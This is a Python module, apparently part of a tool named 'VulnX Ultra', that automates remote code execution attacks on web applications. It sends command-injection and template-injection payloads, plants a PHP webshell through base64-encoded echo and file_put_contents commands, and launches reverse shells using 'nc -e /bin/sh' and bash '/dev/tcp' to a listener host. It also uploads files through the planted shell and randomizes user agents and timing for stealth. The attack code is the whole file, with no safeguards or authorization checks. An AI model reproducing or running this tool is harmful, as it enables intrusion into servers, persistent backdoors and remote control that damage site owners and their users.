#!/usr/bin/env python3
"""
RCEExploiter - Remote Code Execution Exploitation Module for VulnX Ultra
"""

import requests
import urllib.parse
import time
import random
import logging
from rich.console import Console
from rich.panel import Panel
from datetime import datetime
import json
import csv
from fake_useragent import UserAgent
import base64
import os

class RCEExploiter:
    def __init__(self, url, param, method="GET", proxies=None, stealth=False, delay=0, output="rce_exploit", server_url=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.proxies = proxies
        self.stealth = stealth
        self.delay = delay
        self.output = output
        self.server_url = server_url
        self.vulnerable = False
        self.shell_url = None
        self.console = Console()
        self.results = []
        self.ua = UserAgent()

        # Setup logging
        logging.basicConfig(
            filename=f"rce_exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s"
        )

        # RCE Payloads
        self.payloads = [
            ";id",
            "|id",
            "`id`",
            "$(id)",
            "|| id",
            "&& id",
            "; system('id');",
            "| system('id');",
            "` system('id'); `",
            "$( system('id') )",
            "<?php system('id'); ?>",
            "<% Runtime.getRuntime().exec(\"id\") %>",
            "{{ system('id') }}",
            "#{ system('id') }",
            "@( system('id') )",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        ]

    def test_payload(self, payload):
        """Test a single RCE payload."""
        headers = {
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }

        if self.stealth:
            headers.update({
                "Referer": "https://www.google.com/",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            })

        try:
            # Build URL or data based on method
            if self.method == "GET":
                test_url = f"{self.url}?{self.param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
            elif self.method == "POST":
                data = {self.param: payload}
                response = requests.post(self.url, json=data, headers=headers, proxies=self.proxies, timeout=10)
            else:
                self.console.print(f"[red]✗ Unsupported method: {self.method}[/red]")
                logging.error(f"Unsupported method: {self.method}")
                return None

            # Analyze response for RCE indicators
            content = response.text.lower()
            if any(keyword in content for keyword in ["uid=", "gid=", "groups=", "whoami"]):
                self.vulnerable = True
                self.results.append({
                    "payload": payload,
                    "url": self.url,
                    "type": "RCE",
                    "message": "Remote Code Execution vulnerability detected!",
                    "status": response.status_code,
                    "response_time": response.elapsed.total_seconds()
                })
                return True
            return False

        except Exception as e:
            self.console.print(f"[red]✗ Error testing RCE payload {payload}: {str(e)}[/red]")
            logging.error(f"Error testing RCE payload {payload}: {str(e)}")
            return None

    def attempt_command_execution(self, command="whoami"):
        """Attempt to execute a specific command to confirm RCE."""
        command_payloads = [
            f";{command}",
            f"|{command}",
            f"`{command}`",
            f"$({command})",
            f"<?php system('{command}'); ?>"
        ]
        for payload in command_payloads:
            time.sleep(self.delay + (random.uniform(0, 1) if self.stealth else 0))
            headers = {"User-Agent": self.ua.random}
            try:
                if self.method == "GET":
                    test_url = f"{self.url}?{self.param}={urllib.parse.quote(payload)}"
                    response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
                elif self.method == "POST":
                    data = {self.param: payload}
                    response = requests.post(self.url, json=data, headers=headers, proxies=self.proxies, timeout=10)
                else:
                    continue

                if response.status_code == 200 and any(keyword in response.text.lower() for keyword in [command, "uid=", "gid="]):
                    self.vulnerable = True
                    self.results.append({
                        "payload": payload,
                        "url": self.url,
                        "type": "RCE",
                        "message": f"Command execution successful: {command}",
                        "status": response.status_code,
                        "response_time": response.elapsed.total_seconds()
                    })
                    self.console.print(f"[green]✓ Command execution successful with payload: {payload}[/green]")
                    logging.info(f"Command execution successful with payload: {payload}")
                    return True
            except Exception as e:
                self.console.print(f"[red]✗ Error attempting command execution with payload {payload}: {str(e)}[/red]")
                logging.error(f"Error attempting command execution with payload {payload}: {str(e)}")
        return False

    def deploy_webshell(self):
        """Attempt to deploy a webshell if server_url is provided."""
        if not self.server_url:
            self.console.print("[yellow]⚠ No server URL provided for webshell deployment[/yellow]")
            logging.info("No server URL provided for webshell deployment")
            return False

        webshell_payload = f"<?php system($_GET['cmd']); ?>"
        encoded_payload = base64.b64encode(webshell_payload.encode()).decode()
        payloads = [
            f";echo {encoded_payload} | base64 -d > shell.php",
            f"<?php file_put_contents('shell.php', base64_decode('{encoded_payload}')); ?>"
        ]

        for payload in payloads:
            time.sleep(self.delay + (random.uniform(0, 1) if self.stealth else 0))
            headers = {"User-Agent": self.ua.random}
            try:
                if self.method == "GET":
                    test_url = f"{self.url}?{self.param}={urllib.parse.quote(payload)}"
                    response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
                elif self.method == "POST":
                    data = {self.param: payload}
                    response = requests.post(self.url, json=data, headers=headers, proxies=self.proxies, timeout=10)
                else:
                    continue

                # Verify webshell deployment
                shell_url = f"{self.url.split('?')[0]}/shell.php?cmd=whoami"
                verify_response = requests.get(shell_url, headers=headers, proxies=self.proxies, timeout=10)
                if verify_response.status_code == 200 and "uid=" in verify_response.text.lower():
                    self.shell_url = shell_url
                    self.results.append({
                        "payload": payload,
                        "url": self.url,
                        "type": "RCE",
                        "message": f"Webshell deployed successfully at {shell_url}",
                        "status": response.status_code,
                        "response_time": response.elapsed.total_seconds()
                    })
                    self.console.print(f"[green]✓ Webshell deployed successfully at {shell_url}[/green]")
                    logging.info(f"Webshell deployed successfully at {shell_url}")
                    return True
            except Exception as e:
                self.console.print(f"[red]✗ Error deploying webshell with payload {payload}: {str(e)}[/red]")
                logging.error(f"Error deploying webshell with payload {payload}: {str(e)}")
        return False

    def setup_reverse_shell(self, lhost="127.0.0.1", lport=4444):
        """Attempt to setup a reverse shell."""
        reverse_shell_payloads = [
            f";nc -e /bin/sh {lhost} {lport}",
            f"<?php exec('nc -e /bin/sh {lhost} {lport}'); ?>",
            f";bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        ]
        for payload in reverse_shell_payloads:
            time.sleep(self.delay + (random.uniform(0, 1) if self.stealth else 0))
            headers = {"User-Agent": self.ua.random}
            try:
                if self.method == "GET":
                    test_url = f"{self.url}?{self.param}={urllib.parse.quote(payload)}"
                    response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
                elif self.method == "POST":
                    data = {self.param: payload}
                    response = requests.post(self.url, json=data, headers=headers, proxies=self.proxies, timeout=10)
                else:
                    continue

                self.results.append({
                    "payload": payload,
                    "url": self.url,
                    "type": "RCE",
                    "message": f"Attempted reverse shell to {lhost}:{lport}",
                    "status": response.status_code,
                    "response_time": response.elapsed.total_seconds()
                })
                self.console.print(f"[green]✓ Attempted reverse shell to {lhost}:{lport}[/green]")
                logging.info(f"Attempted reverse shell to {lhost}:{lport}")
                return True
            except Exception as e:
                self.console.print(f"[red]✗ Error setting up reverse shell with payload {payload}: {str(e)}[/red]")
                logging.error(f"Error setting up reverse shell with payload {payload}: {str(e)}")
        return False

    def upload_file(self, target_url, local_file, remote_path):
        """Upload a file to the target system if a webshell is deployed."""
        if not self.shell_url:
            self.console.print("[yellow]⚠ No webshell deployed for file upload[/yellow]")
            logging.info("No webshell deployed for file upload")
            return False

        try:
            with open(local_file, "rb") as f:
                file_content = f.read()
            encoded_content = base64.b64encode(file_content).decode()
            upload_payload = f"<?php file_put_contents('{remote_path}', base64_decode('{encoded_content}')); ?>"

            headers = {"User-Agent": self.ua.random}
            upload_url = f"{self.shell_url}&cmd={urllib.parse.quote(upload_payload)}"
            response = requests.get(upload_url, headers=headers, proxies=self.proxies, timeout=10)

            if response.status_code == 200:
                self.results.append({
                    "payload": upload_payload,
                    "url": upload_url,
                    "type": "RCE",
                    "message": f"File uploaded successfully to {remote_path}",
                    "status": response.status_code,
                    "response_time": response.elapsed.total_seconds()
                })
                self.console.print(f"[green]✓ File uploaded successfully to {remote_path}[/green]")
                logging.info(f"File uploaded successfully to {remote_path}")
                return True
            else:
                self.console.print(f"[red]✗ Failed to upload file to {remote_path}[/red]")
                logging.error(f"Failed to upload file to {remote_path}")
                return False
        except Exception as e:
            self.console.print(f"[red]✗ Error uploading file: {str(e)}[/red]")
            logging.error(f"Error uploading file: {str(e)}")
            return False

    def post_exploitation(self, target_url):
        """Perform post-exploitation tasks such as deploying webshell or reverse shell."""
        if not self.vulnerable:
            self.console.print("[yellow]⚠ No RCE vulnerabilities detected for post-exploitation[/yellow]")
            logging.info("No RCE vulnerabilities detected for post-exploitation")
            return

        self.console.print("[yellow]Starting RCE post-exploitation...[/yellow]")
        logging.info("Starting RCE post-exploitation")

        # Deploy webshell if server_url is provided
        if self.server_url:
            self.deploy_webshell()

        # Attempt reverse shell
        self.setup_reverse_shell()

    def exploit(self):
        """Main exploitation function."""
        self.console.print(Panel.fit("[bold red]Starting RCE Exploitation[/bold red]"))
        logging.info("Starting RCE exploitation")

        # Test all payloads
        for payload in self.payloads:
            if self.test_payload(payload):
                self.console.print(f"[green]✓ Vulnerable to RCE with payload: {payload}[/green]")
                logging.info(f"Vulnerable to RCE with payload: {payload}")

        # If vulnerable, attempt command execution and post-exploitation
        if self.vulnerable:
            self.console.print("[yellow]Attempting command execution...[/yellow]")
            if self.attempt_command_execution():
                self.console.print("[green]✓ Command execution completed[/green]")

            self.console.print("[yellow]Performing post-exploitation...[/yellow]")
            self.post_exploitation(self.url)

        # Save results
        if self.results:
            self.save_results()
        else:
            self.console.print("[yellow]⚠ No RCE vulnerabilities exploited.[/yellow]")
            logging.info("No RCE vulnerabilities exploited")

    def save_results(self):
        """Save exploitation results to file."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        try:
            if self.output.endswith(".json"):
                with open(f"{self.output}_{timestamp}.json", "w") as f:
                    json.dump(self.results, f, indent=4, ensure_ascii=False)
                self.console.print(f"[green]✓ Results saved to {self.output}_{timestamp}.json[/green]")
                logging.info(f"Results saved to {self.output}_{timestamp}.json")
            elif self.output.endswith(".csv"):
                with open(f"{self.output}_{timestamp}.csv", "w", newline="", encoding="utf-8") as f:
                    fieldnames = ["payload", "url", "type", "message", "status", "response_time"]
                    writer = csv.DictWriter(f, fieldnames=fieldnames)
                    writer.writeheader()
                    for result in self.results:
                        row = {key: result.get(key, "N/A") for key in fieldnames}
                        writer.writerow(row)
                self.console.print(f"[green]✓ Results saved to {self.output}_{timestamp}.csv[/green]")
                logging.info(f"Results saved to {self.output}_{timestamp}.csv")
            else:
                with open(f"{self.output}_{timestamp}.txt", "w", encoding="utf-8") as f:
                    for result in self.results:
                        f.write(f"Payload: {result.get('payload', 'N/A')}\n")
                        f.write(f"URL: {result.get('url', 'N/A')}\n")
                        f.write(f"Type: {result.get('type', 'N/A')}\n")
                        f.write(f"Message: {result.get('message', 'N/A')}\n")
                        f.write(f"Status: {result.get('status', 'N/A')}\n")
                        f.write(f"Response Time: {result.get('response_time', 'N/A')}s\n")
                        f.write("\n" + "="*50 + "\n\n")
                self.console.print(f"[green]✓ Results saved to {self.output}_{timestamp}.txt[/green]")
                logging.info(f"Results saved to {self.output}_{timestamp}.txt")
        except Exception as e:
            self.console.print(f"[red]✗ Error saving results: {str(e)}[/red]")
            logging.error(f"Error saving results: {str(e)}")
            